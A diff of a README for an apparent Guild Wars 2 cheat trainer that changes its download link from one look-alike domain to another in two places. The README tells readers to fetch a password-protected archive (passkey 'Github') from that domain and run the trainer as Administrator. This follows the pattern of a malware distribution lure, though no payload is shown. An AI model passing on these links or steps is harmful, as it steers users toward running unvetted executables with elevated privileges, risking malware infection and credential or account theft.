@@ -6,7 +6,7 @@ Guild Wars 2 trainer with god mode, unlimited gold, skill cooldown removal, tele
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **GW2Hack**, **GuildWars2Cheat**, and **TrainerGW2**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Guild Wars 2.
 4. Run the trainer **as Administrator**.
